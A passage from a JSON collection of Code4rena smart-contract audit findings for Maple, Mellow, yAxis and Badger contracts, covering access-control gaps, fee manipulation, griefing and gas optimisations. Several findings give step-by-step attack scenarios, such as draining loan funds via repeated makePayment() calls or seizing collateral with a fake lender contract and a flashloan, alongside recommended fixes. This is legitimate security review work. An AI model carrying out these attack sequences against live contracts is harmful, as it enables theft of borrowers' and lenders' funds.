      "repo": "https://github.com/code-423n4/2021-12-maple-findings",
      "url": "https://github.com/code-423n4/2021-12-maple-findings/issues/62"
    }
  },
  {
    "title": "`makePayment()` Lack of access control allows malicious `lender` to retrieve a large portion of the funds earlier, making the borrower suffer fund loss",
    "severity": "major",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/maple-labs/loan/blob/9684bcef06481e493d060974b1777a4517c4e792/contracts/MapleLoan.sol#L86-L93\n\n```solidity=86\nfunction makePayment(uint256 amount_) external override returns (uint256 principal_, uint256 interest_) {\n        // The amount specified is an optional amount to be transfer from the caller, as a convenience for EOAs.\n        require(amount_ == uint256(0) || ERC20Helper.transferFrom(_fundsAsset, msg.sender, address(this), amount_), \"ML:MP:TRANSFER_FROM_FAILED\");\n\n        ( principal_, interest_ ) = _makePayment();\n\n        emit PaymentMade(principal_, interest_);\n    }\n```\n\nThe current implementation allows anyone to call `makePayment()` and repay the loan with `_drawableFunds`.\n\nThis makes it possible for a malicious `lender` to call `makePayment()` multiple times right after `fundLoan()` and retrieve most of the funds back immediately, while then `borrower` must continue to make payments or lose the `collateral`.\n\n### PoC \n\nGiven:\n\n- `_collateralRequired` = 1 BTC\n- `_principalRequested` = 12,000 USDC\n- `_paymentInterval` = 30 day\n- `_paymentsRemaining` = 12\n- `_gracePeriod` = 1 day\n- `interestRate_` = 2e17\n\n1. The borrower calls `postCollateral()` and added `1 BTC` as `_collateralAsset`;\n2. The lender calls `fundLoan()` and added `12,000 USDC` as  `_fundsAsset`;\n3. The lender calls `makePayment()` 11 times, then:\n- `_drawableFunds` = 96\n- `_claimableFunds` = 11903\n- `_principal` = 1553\n\n4. The lender calls `_claimFunds()` get 11,903 USDC of `_fundsAsset` back;\n\nNow, for the borrower `1,579 USDC` is due, but only `96 USDC` can be used. The borrower is now forced to pay the interests for the funds that never be used or lose the collateral.\n\n### Recommendation\n\nChange to:\n\n```solidity=86\nfunction makePayment(uint256 amount_) external override returns (uint256 principal_, uint256 interest_) {\n        // The amount specified is an optional amount to be transfer from the caller, as a convenience for EOAs.\n        require(amount_ == uint256(0) || ERC20Helper.transferFrom(_fundsAsset, msg.sender, address(this), amount_), \"ML:MP:TRANSFER_FROM_FAILED\");\n\n        require(msg.sender == _borrower, \"ML:DF:NOT_BORROWER\");\n    \n        ( principal_, interest_ ) = _makePayment();\n\n        emit PaymentMade(principal_, interest_);\n    }\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-maple-findings",
      "repo": "https://github.com/code-423n4/2021-12-maple-findings",
      "url": "https://github.com/code-423n4/2021-12-maple-findings/issues/56"
    }
  },
  {
    "title": "Unchecked return value for `ERC20.approve` call",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nThere are a few functions across the codebase that will perform an ERC20.approve() call but does not check the success return value. Some tokens do not revert if the approval failed but return false instead.\n\nInstances include:\n\nhttps://github.com/maple-labs/liquidations/blob/bb09e17b1fac1126ce7734e58c3133be06162590/contracts/SushiswapStrategy.sol#L55-L55\n```solidity=55\nERC20Helper.approve(collateralAsset_, ROUTER, swapAmount_);\n```\n\nhttps://github.com/maple-labs/liquidations/blob/bb09e17b1fac1126ce7734e58c3133be06162590/contracts/UniswapV2Strategy.sol#L55-L55\n```solidity=55\nERC20Helper.approve(collateralAsset_, ROUTER, swapAmount_);\n```\n\nIt is usually good to add a require-statement that checks the return value or to use something like `safeApprove`; unless one is sure the given token reverts in case of a failure.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-maple-findings",
      "repo": "https://github.com/code-423n4/2021-12-maple-findings",
      "url": "https://github.com/code-423n4/2021-12-maple-findings/issues/52"
    }
  },
  {
    "title": "Unsafe implementation of `fundLoan()` allows attacker to steal collateral from an unfunded loan",
    "severity": "medium",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/maple-labs/loan/blob/9684bcef06481e493d060974b1777a4517c4e792/contracts/MapleLoanInternals.sol#L257-L273\n\n```solidity=257\n    uint256 treasuryFee = (fundsLent_ * ILenderLike(lender_).treasuryFee() * _paymentInterval * _paymentsRemaining) / uint256(365 days * 10_000);\n\n    // Transfer delegate fee, if any, to the pool delegate, and decrement drawable funds.\n    uint256 delegateFee = (fundsLent_ * ILenderLike(lender_).investorFee() * _paymentInterval * _paymentsRemaining) / uint256(365 days * 10_000);\n\n    // Drawable funds is the amount funded, minus any fees.\n    _drawableFunds = fundsLent_ - treasuryFee - delegateFee;\n\n    require(\n        treasuryFee == uint256(0) || ERC20Helper.transfer(_fundsAsset, ILenderLike(lender_).mapleTreasury(), treasuryFee),\n        \"MLI:FL:T_TRANSFER_FAILED\"\n    );\n\n    require(\n        delegateFee == uint256(0) || ERC20Helper.transfer(_fundsAsset, ILenderLike(lender_).poolDelegate(), delegateFee),\n        \"MLI:FL:PD_TRANSFER_FAILED\"\n        );\n```\n\nIn the current implementation, `mapleTreasury`, `poolDelegate` and `treasuryFee` are taken from user input `lender_`, which can be faked by setting up a contract with `ILenderLike` interfaces.\n\nThis allows the attacker to set very high fees, making `_drawableFunds` near 0.\n\nSince `mapleTreasury` and `poolDelegate` are also read from `lender_`, `treasuryFee` and `investorFee` can be retrieved back to the attacker.\n\nAs a result, the borrower won't get any `_drawableFunds` while also being unable to remove collateral.\n\n### PoC\n\nGiven:\n\n- `_collateralRequired` = 10 BTC\n- `_principalRequested` = 1,000,000 USDC\n- `_paymentInterval` = 1 day\n- `_paymentsRemaining` = 10\n- `_gracePeriod` = 1 day\n\n1. Alice (borrower) calls `postCollateral()` and added `10 BTC` as `_collateralAsset`;\n2. The attacker calls `fundLoan()` by taking `1,000,000 USDC` of flashloan and using a fake `lender`contract;\n3. Alice calls `drawdownFunds()` with any amount > 0 will fail;\n4. Alice calls `removeCollateral()` with any amount > 0 will get \"MLI:DF:INSUFFICIENT_COLLATERAL\" error;\n5. Unless Alice make payment (which is meaningless), after 2 day, the attacker can call `repossess()` and get `10 BTC`.\n\n### Recommendation\n\nConsider reading `treasuryFee`, `investorFee`, `mapleTreasury`, `poolDelegate` from an authoritative source instead.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-maple-findings",
      "repo": "https://github.com/code-423n4/2021-12-maple-findings",
      "url": "https://github.com/code-423n4/2021-12-maple-findings/issues/47"
    }
  },
  {
    "title": "Anyone can call `closeLoan()` to close the loan",
    "severity": "medium",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/maple-labs/loan/blob/9684bcef06481e493d060974b1777a4517c4e792/contracts/MapleLoan.sol#L56-L63\n\n```solidity=56\nfunction closeLoan(uint256 amount_) external override returns (uint256 principal_, uint256 interest_) {\n        // The amount specified is an optional amount to be transfer from the caller, as a convenience for EOAs.\n        require(amount_ == uint256(0) || ERC20Helper.transferFrom(_fundsAsset, msg.sender, address(this), amount_), \"ML:CL:TRANSFER_FROM_FAILED\");\n\n        ( principal_, interest_ ) = _closeLoan();\n\n        emit LoanClosed(principal_, interest_);\n    }\n```\n\nBased on the context, we believe that the `closeLoan()` should only be called by the `borrower`. However, the current implementation allows anyone to call `closeLoan()` anytime after `fundLoan()`.\n\nIf there is no `earlyFee`, this enables a griefing attack, causing the `borrower` and `lender` to abandon this contract and redo everything which costs more gas.\n\nIf a platform fee exits, the lender will also suffer fund loss from the platform fee charged in `fundLoan()`.\n\n### Recommendation\n\nChange to:\n\n```solidity=56\nfunction closeLoan(uint256 amount_) external override returns (uint256 principal_, uint256 interest_) {\n        // The amount specified is an optional amount to be transfer from the caller, as a convenience for EOAs.\n        require(amount_ == uint256(0) || ERC20Helper.transferFrom(_fundsAsset, msg.sender, address(this), amount_), \"ML:CL:TRANSFER_FROM_FAILED\");\n\n        require(msg.sender == _borrower, \"ML:DF:NOT_BORROWER\");\n\n        ( principal_, interest_ ) = _closeLoan();\n\n        emit LoanClosed(principal_, interest_);\n    }\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-maple-findings",
      "repo": "https://github.com/code-423n4/2021-12-maple-findings",
      "url": "https://github.com/code-423n4/2021-12-maple-findings/issues/46"
    }
  },
  {
    "title": "Functionality of liquidation strategies can be broken",
    "severity": "minor",
    "body": "# Handle\n\ncmichel\n\n\n# Vulnerability details\n\nThe liquidations strategies (`code-423n4/evm-league/56-maple/repo/liquidations-1.0.0-beta.1/contracts/SushiswapStrategy.sol/UniswapStrategy.sol`) check that the current contract balance in the `swap` callback exactly equals the `swapAmount_` parameter from `flashBorrowLiquidation`.\n(The `swap` is called as a callback from `flashBorrowLiquidation`'s `liquidatePortion`).\n\n```solidity\nfunction swap(\n    uint256 swapAmount_,\n    uint256 minReturnAmount_,\n    address collateralAsset_,\n    address middleAsset_,\n    address fundsAsset_,\n    address profitDestination_\n)\n    external override\n{\n    // @audit grifer can send 1 wei. should >=\n    require(IERC20Like(collateralAsset_).balanceOf(address(this)) == swapAmount_, \"SushiswapStrategy:WRONG_COLLATERAL_AMT\");\n}\n```\n\nThere's a griefing attacker where a keeper tries to liquidate and calls `flashBorrowLiquidation`  but an attacker frontruns this transaction and sends the smallest unit of the `collateralAsset_` to the contract, making this `require` call fail.\n\n## Impact\nThe important automated liquidation strategies that Keepers might use do not work anymore, no liquidations are done in time, and bad debt can occur.\n\nI'd rate this as high severity as the impact is big and it's also very easy to break this contract entirely with a single transfer:\n- there's only one strategy contract for many liquidation contracts which means it's important that it's reliable\n- it's enough to send a few tokens of collateral assets to the contract _once_ to break the `flashBorrowLiquidation/swap` functionality. Because when calling `flashBorrowLiquidation(swapAmount)`, the liquidation contract will always send exactly this `swapAmount` to the strategy, meaning the `IERC20Like(collateralAsset_).balanceOf(address(this)) == swapAmount_` comparison will always fail if there already were tokens in the contract.\n\n## Recommended Mitigation Steps\nUse a `IERC20Like(collateralAsset_).balanceOf(address(this)) >= swapAmount_` comparison instead.\n\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-maple-findings",
      "repo": "https://github.com/code-423n4/2021-12-maple-findings",
      "url": "https://github.com/code-423n4/2021-12-maple-findings/issues/35"
    }
  },
  {
    "title": "Must approve 0 first",
    "severity": "minor",
    "body": "# Handle\n\nrobee\n\n\n# Vulnerability details\n\nSome tokens (like USDT) do not work when changing the allowance from an existing non-zero allowance value.They must first be approved by zero and then the actual allowance must be approved. \nYou don't first approve 0 in the following places in the codebase: \n\n\n\n\n\n\n        approve without approving 0 first SushiswapStrategy.sol, 25,         ERC20Helper.approve(fundsAsset_, lender_, repaymentAmount);\n\n        approve without approving 0 first SushiswapStrategy.sol, 54,         ERC20Helper.approve(collateralAsset_, ROUTER, swapAmount_);\n\n        approve without approving 0 first UniswapV2Strategy.sol, 25,         ERC20Helper.approve(fundsAsset_, lender_, repaymentAmount);\n\n        approve without approving 0 first UniswapV2Strategy.sol, 54,         ERC20Helper.approve(collateralAsset_, ROUTER, swapAmount_);\n\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-maple-findings",
      "repo": "https://github.com/code-423n4/2021-12-maple-findings",
      "url": "https://github.com/code-423n4/2021-12-maple-findings/issues/11"
    }
  },
  {
    "title": "Save Gas With The Unchecked Keyword",
    "body": "# Handle\n\nye0lde\n\n\n# Vulnerability details\n\n## Impact\n\nRedundant arithmetic underflow/overflow checks can be avoided when an underflow/overflow cannot happen.\n\n## Proof of Concept\n\nThe \"unchecked\" keyword can be applied here since there is an \"if\" statement to ensure the arithmetic operations would not cause an integer underflow or overflow.\nhttps://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/LpIssuer.sol#L130-L134\nChange the code at 130 to:\n\n```\n        unchecked {  \n            for (uint256 i = 0; i < _vaultTokens.length; i++) {\n                if (balancedAmounts[i] > actualTokenAmounts[i]) {\n                    IERC20(_vaultTokens[i]).safeTransfer(msg.sender, balancedAmounts[i] - actualTokenAmounts[i]);\n                }\n            }\n        }\n```\n\nA similar change can be made here:\nhttps://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/Vault.sol#L115-L120\nChange the code at 115 to:\n\n```\n        unchecked {\n            for (uint256 i = 0; i < tokens.length; i++) { \n                uint256 leftover = actualTokenAmounts[i] < tokenAmounts[i] ? tokenAmounts[i] - actualTokenAmounts[i] : 0;\n                if (leftover != 0) { \n                    IERC20(tokens[i]).safeTransfer(from, leftover);\n                }\n            }\n        }\n```\nNote that `leftover > 0` has been changed to `leftover !=0` for additional gas savings.\n\nOther locations `unchecked` can be used:\nhttps://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/trader/UniV3Trader.sol#L114-L115\nhttps://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/trader/UniV3Trader.sol#L154-L155\n\n## Tools Used\nVisual Studio Code, Remix\n\n## Recommended Mitigation Steps\nAdd the \"unchecked\" keyword as shown above.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-mellow-findings",
      "repo": "https://github.com/code-423n4/2021-12-mellow-findings",
      "url": "https://github.com/code-423n4/2021-12-mellow-findings/issues/123"
    }
  },
  {
    "title": "`YearnVault.sol#pull()` will most certainly fail",
    "severity": "major",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/test_brownie/contracts/YearnVault.sol#L84-L101\n\n```solidity=84\n    for (uint256 i = 0; i < _yTokens.length; i++) {\n        if (tokenAmounts[i] == 0) {\n            continue;\n        }\n\n        IYearnVault yToken = IYearnVault(_yTokens[i]);\n        uint256 yTokenAmount = ((tokenAmounts[i] * (10**yToken.decimals())) / yToken.pricePerShare());\n        uint256 balance = yToken.balanceOf(address(this));\n        if (yTokenAmount > balance) {\n            yTokenAmount = balance;\n        }\n        if (yTokenAmount == 0) {\n            continue;\n        }\n        yToken.withdraw(yTokenAmount, to, maxLoss);\n        (tokenAmounts[i], address(this));\n    }\n    actualTokenAmounts = tokenAmounts;\n```\n\nThe actual token withdrew from `yToken.withdraw()` will most certainly be less than the `tokenAmounts[i]`, due to precision loss in the calculation of `yTokenAmount`.\n\nAs a result, `IERC20(_vaultTokens[i]).safeTransfer(to, actualTokenAmounts[i]);` in `LpIssuer.sol#withdraw()` will revert due to insufficant balance.\n\n ### Recommendation\n\nChange to:\n\n```solidity=98\ntokenAmounts[i] = yToken.withdraw(yTokenAmount, to, maxLoss);\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-mellow-findings",
      "repo": "https://github.com/code-423n4/2021-12-mellow-findings",
      "url": "https://github.com/code-423n4/2021-12-mellow-findings/issues/121"
    }
  },
  {
    "title": " The Contract Should Approve(0) first",
    "severity": "minor",
    "body": "# Handle\n\ndefsec\n\n\n# Vulnerability details\n\n## Impact\n\nSome tokens (like USDT L199) do not work when changing the allowance from an existing non-zero allowance value.\nThey must first be approved by zero and then the actual allowance must be approved.\n\n```\nIERC20(token).approve(address(operator), 0);\nIERC20(token).approve(address(operator), amount);\n```\n\n## Proof of Concept\n\n1. Navigate to the following contracts.\n\n```\nhttps://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/YearnVault.sol#L106\n\nhttps://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/UniV3Vault.sol#L228\n\nhttps://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/AaveVault.sol#L103\n\nhttps://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/ERC20Vault.sol#L104\n\n```\n2.  When trying to re-approve an already approved token, all transactions revert and the protocol cannot be used.\n\n## Tools Used\n\nNone\n\n## Recommended Mitigation Steps\n\nApprove with a zero amount first before setting the actual amount.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-mellow-findings",
      "repo": "https://github.com/code-423n4/2021-12-mellow-findings",
      "url": "https://github.com/code-423n4/2021-12-mellow-findings/issues/115"
    }
  },
  {
    "title": "`ChiefTrader.sol` Wrong implementation of `swapExactInput()` and `swapExactOutput()`",
    "severity": "medium",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nWhen a caller calls `ChiefTrader.sol#swapExactInput()`, it will call `ITrader(traderAddress).swapExactInput()`.\n\nhttps://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/trader/ChiefTrader.sol#L59-L59\n\n```solidity=59\nreturn ITrader(traderAddress).swapExactInput(0, amount, recipient, path, options);\n```\n\nHowever, in the current implementation, inputToken is not approved to the `traderAddress`.\n\nFor example, in `UniV3Trader.sol#_swapExactInputSingle`, at L89, it tries to transfer inputToken from `msg.sender` (which is `ChiefTrader`), since it's not approved, this will revert.\n\nPlus, the inputToken should also be transferred from the caller before calling the subtrader.\n\nhttps://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/trader/UniV3Trader.sol#L89-L89\n\n```solidity=89\n    IERC20(input).safeTransferFrom(msg.sender, address(this), amount);\n```\n\nThe same problem exits in `swapExactOutput()`:\n\nhttps://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/trader/ChiefTrader.sol#L63-L75\n\n```solidity=63\nfunction swapExactOutput(\n        uint256 traderId,\n        uint256 amount,\n        address,\n        PathItem[] calldata path,\n        bytes calldata options\n    ) external returns (uint256) {\n        require(traderId < _traders.length, TraderExceptionsLibrary.TRADER_NOT_FOUND_EXCEPTION);\n        _requireAllowedTokens(path);\n        address traderAddress = _traders[traderId];\n        address recipient = msg.sender;\n        return ITrader(traderAddress).swapExactOutput(0, amount, recipient, path, options);\n    }\n```\n\n### Recommendation\n\nApprove the inputToken to the subtrader and transfer from the caller before calling `ITrader.swapExactInput()` and `ITrader.swapExactOutput()`.\n\nOr maybe just remove support of `swapExactInput()` and `swapExactOutput()` in `ChiefTrader`.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-mellow-findings",
      "repo": "https://github.com/code-423n4/2021-12-mellow-findings",
      "url": "https://github.com/code-423n4/2021-12-mellow-findings/issues/108"
    }
  },
  {
    "title": "Unnecessary checked arithmetic in for loops",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nThere is no risk of overflow caused by increamenting the iteration index in for loops (the `i++` in for `for (uint256 i = 0; i < tokens.length; i++)`).\n\nIncrements perform overflow checks that are not necessary in this case.\n\n### Recommendation\n\nSurround the increment expressions with an `unchecked { ... }` block to avoid the default overflow checks. For example, change the loop:\n\nhttps://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/Vault.sol#L109-L113\n\n```solidity=109\nfor (uint256 i = 0; i < tokens.length; i++) {\n    if (tokenAmounts[i] > 0) {\n        IERC20(tokens[i]).safeTransferFrom(from, address(this), tokenAmounts[i]);\n    }\n}\n```\n\nto:\n\n```solidity=109\nfor (uint256 i = 0; i < tokens.length;) {\n    if (tokenAmounts[i] > 0) {\n        IERC20(tokens[i]).safeTransferFrom(from, address(this), tokenAmounts[i]);\n    }\n    unchecked { ++i; }\n}\n```\n\nIt is a little less readable but it saves a significant amount of gas.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-mellow-findings",
      "repo": "https://github.com/code-423n4/2021-12-mellow-findings",
      "url": "https://github.com/code-423n4/2021-12-mellow-findings/issues/101"
    }
  },
  {
    "title": "Cache storage variables in the stack can save gas",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nFor the storage variables that will be accessed multiple times, cache them in the stack can save ~100 gas from each extra read (`SLOAD` after Berlin).\n\nFor example:\n\n- `_vaultTokens[i]` in `LpIssuer#deposit()`\n\n    https://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/LpIssuer.sol#L104-L109\n\n    ```solidity=104{107-108}\n    // Making sure the proportion between tokenAmounts and tvl are the same\n    for (uint256 i = 0; i < _vaultTokens.length; i++) {\n        balancedAmounts[i] = _getBalancedAmount(tvl[i], tokenAmounts[i], existentials_[i], balanceFactor, supply);\n        _allowTokenIfNecessary(_vaultTokens[i], address(subvault));\n        IERC20(_vaultTokens[i]).safeTransferFrom(msg.sender, address(this), balancedAmounts[i]);\n    }\n    ```\n\n\n- `_vaultTokens.length` in `LpIssuer#withdraw()`\n\n    https://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/LpIssuer.sol#L140-L162\n\n    ```solidity=140{147,149,153}\n    function withdraw(\n        address to,\n        uint256 lpTokenAmount,\n        bytes memory options\n    ) external nonReentrant {\n        uint256 supply = totalSupply();\n        require(supply > 0, ExceptionsLibrary.TOTAL_SUPPLY_IS_ZERO);\n        uint256[] memory tokenAmounts = new uint256[](_vaultTokens.length);\n        uint256[] memory tvl = _subvault().tvl();\n        for (uint256 i = 0; i < _vaultTokens.length; i++) {\n            tokenAmounts[i] = (lpTokenAmount * tvl[i]) / supply;\n        }\n        uint256[] memory actualTokenAmounts = _subvault().pull(address(this), _vaultTokens, tokenAmounts, options);\n        for (uint256 i = 0; i < _vaultTokens.length; i++) {\n            if (actualTokenAmounts[i] == 0) {\n                continue;\n            }\n            IERC20(_vaultTokens[i]).safeTransfer(to, actualTokenAmounts[i]);\n        }\n        _chargeFees(_nft, tvl, supply, actualTokenAmounts, lpTokenAmount, true);\n        _burn(msg.sender, lpTokenAmount);\n        emit Withdraw(msg.sender, _vaultTokens, actualTokenAmounts, lpTokenAmount);\n    }\n    ```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-mellow-findings",
      "repo": "https://github.com/code-423n4/2021-12-mellow-findings",
      "url": "https://github.com/code-423n4/2021-12-mellow-findings/issues/96"
    }
  },
  {
    "title": "Use immutable variables can save gas",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/LpIssuer.sol#L20-L20\n\n```solidity=20\nIVaultGovernance internal _vaultGovernance;\n```\n\n```solidity=35\nconstructor(\n    IVaultGovernance vaultGovernance_,\n    address[] memory vaultTokens_,\n    string memory name_,\n    string memory symbol_\n) ERC20(name_, symbol_) {\n    require(CommonLibrary.isSortedAndUnique(vaultTokens_), ExceptionsLibrary.SORTED_AND_UNIQUE);\n    _vaultGovernance = vaultGovernance_;\n    _vaultTokens = vaultTokens_;\n    // ...\n}\n```\n\n`_vaultGovernance` will never change, use immutable variable instead of storage variable can save gas.\n\n\nhttps://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/trader/UniV3Trader.sol#L26-L30\n\n```solidity=26\nISwapRouter public swapRouter;\n\nconstructor(address _swapRouter) {\n    swapRouter = ISwapRouter(_swapRouter);\n}\n```\n\n`swapRouter` will never change, use immutable variable instead of storage variable can save gas.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-mellow-findings",
      "repo": "https://github.com/code-423n4/2021-12-mellow-findings",
      "url": "https://github.com/code-423n4/2021-12-mellow-findings/issues/92"
    }
  },
  {
    "title": "Cache external call results can save gas",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nEvery call to an external contract costs a decent amount of gas. For optimization of gas usage, external call results should be cached if they are being used for more than one time.\n\nFor example:\n\nhttps://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/AaveVault.sol#L101-L109\n\n```solidity=101\nfunction _allowTokenIfNecessary(address token) internal {\n    if (IERC20(token).allowance(address(this), address(_lendingPool())) < type(uint256).max / 2) {\n        IERC20(token).approve(address(_lendingPool()), type(uint256).max);\n    }\n}\n\nfunction _lendingPool() internal view returns (ILendingPool) {\n    return IAaveVaultGovernance(address(_vaultGovernance)).delayedProtocolParams().lendingPool;\n}\n```\n\nConsidering that `_lendingPool()` is a internal call that includes a storage read of `_vaultGovernance` and an external call of `IAaveVaultGovernance.delayedProtocolParams()`. Cache the result of `_lendingPool()` in the stack can save some gas.\n\n### Recommendation\n\nChange to:\n\n```solidity\nfunction _allowTokenIfNecessary(address token) internal {\n    address lendingPool = address(_lendingPool());\n    if (IERC20(token).allowance(address(this), lendingPool) < type(uint256).max / 2) {\n        IERC20(token).approve(lendingPool, type(uint256).max);\n    }\n}\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-mellow-findings",
      "repo": "https://github.com/code-423n4/2021-12-mellow-findings",
      "url": "https://github.com/code-423n4/2021-12-mellow-findings/issues/89"
    }
  },
  {
    "title": "Unsafe token transfer",
    "severity": "minor",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nCalling `ERC20.transfer()` without handling the returned value is unsafe.\n\nhttps://github.com/code-423n4/2021-12-mellow/blob/6679e2dd118b33481ee81ad013ece4ea723327b5/mellow-vaults/contracts/ERC20Vault.sol#L81-L90\n\n```solidity=81\nfunction _pull(\n        address to,\n        uint256[] memory tokenAmounts,\n        bytes memory\n    ) internal override returns (uint256[] memory actualTokenAmounts) {\n        for (uint256 i = 0; i < tokenAmounts.length; i++) {\n            IERC20(_vaultTokens[i]).transfer(to, tokenAmounts[i]);\n        }\n        actualTokenAmounts = tokenAmounts;\n    }\n```\n\n### Recommendation\n\nConsider using OpenZeppelin's `SafeERC20` library with safe versions of transfer functions.\n\n",
    "dataSource": {
      "name": "code-423n4/2021-12-mellow-findings",
      "repo": "https://github.com/code-423n4/2021-12-mellow-findings",
      "url": "https://github.com/code-423n4/2021-12-mellow-findings/issues/88"
    }
  },
  {
    "title": "Require statements without messages",
    "body": "# Handle\n\npants\n\n\n# Vulnerability details\n\n# Vulnerability details\n\n`Alchemist.sol` line 520\n`MockERC20NonStandard.sol` 27\n`MockERC20NonStandard.sol` 31\n\ncontain a bunch of require statement without messages\n\n## Impact\nWhen transactions revert, the users won't receive error messages indicating the cause of the failure.\n\n## Tool Used\nManual code review.\n\n## Recommended Mitigation Steps\nAdd informative error messages to these require statements.\n\n\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-yaxis-findings",
      "repo": "https://github.com/code-423n4/2021-11-yaxis-findings",
      "url": "https://github.com/code-423n4/2021-11-yaxis-findings/issues/88"
    }
  },
  {
    "title": "Missing `_token.approve()` to `curvePool` in `setZapConfig`",
    "severity": "medium",
    "body": "# Handle\n\nWatchPug\n\n\n# Vulnerability details\n\nhttps://github.com/Badger-Finance/badger-ibbtc-utility-zaps/blob/8d265aacb905d30bd95dcd54505fb26dc1f9b0b6/contracts/SettToRenIbbtcZap.sol#L162-L183\n\n```solidity=162\nfunction setZapConfig(\n        uint256 _idx,\n        address _sett,\n        address _token,\n        address _curvePool,\n        address _withdrawToken,\n        int128 _withdrawTokenIndex\n    ) external {\n        _onlyGovernance();\n\n        require(_sett != address(0));\n        require(_token != address(0));\n        require(\n            _withdrawToken == address(WBTC) || _withdrawToken == address(RENBTC)\n        );\n\n        zapConfigs[_idx].sett = ISett(_sett);\n        zapConfigs[_idx].token = IERC20Upgradeable(_token);\n        zapConfigs[_idx].curvePool = ICurveFi(_curvePool);\n        zapConfigs[_idx].withdrawToken = IERC20Upgradeable(_withdrawToken);\n        zapConfigs[_idx].withdrawTokenIndex = _withdrawTokenIndex;\n    }\n```\n\nIn the current implementation, when `curvePool` or `token` got updated, `token` is not approved to `curvePool`, which will malfunction the contract and break minting.\n\n### Recommendation\n\nChange to:\n\n```solidity=162\nfunction setZapConfig(\n        uint256 _idx,\n        address _sett,\n        address _token,\n        address _curvePool,\n        address _withdrawToken,\n        int128 _withdrawTokenIndex\n    ) external {\n        _onlyGovernance();\n\n        require(_sett != address(0));\n        require(_token != address(0));\n        require(\n            _withdrawToken == address(WBTC) || _withdrawToken == address(RENBTC)\n        );\n\n        if (zapConfigs[_idx].curvePool != _curvePool && _curvePool != address(0)) {\n            IERC20Upgradeable(_token).safeApprove(\n                _curvePool,\n                type(uint256).max\n            );\n        }\n\n        zapConfigs[_idx].sett = ISett(_sett);\n        zapConfigs[_idx].token = IERC20Upgradeable(_token);\n        zapConfigs[_idx].curvePool = ICurveFi(_curvePool);\n        zapConfigs[_idx].withdrawToken = IERC20Upgradeable(_withdrawToken);\n        zapConfigs[_idx].withdrawTokenIndex = _withdrawTokenIndex;\n    }\n```\n\n",
    "dataSource": {
      "name": "code-423n4/2021-11-badgerzaps-findings",
      "repo": "https://github.com/code-423n4/2021-11-badgerzaps-findings",
      "url": "https://github.com/code-423n4/2021-11-badgerzaps-findings/issues/53"
    }
  },
  {
    "title": "`Zap.sol#mint()` Check `blockLock` earlier can save gas",
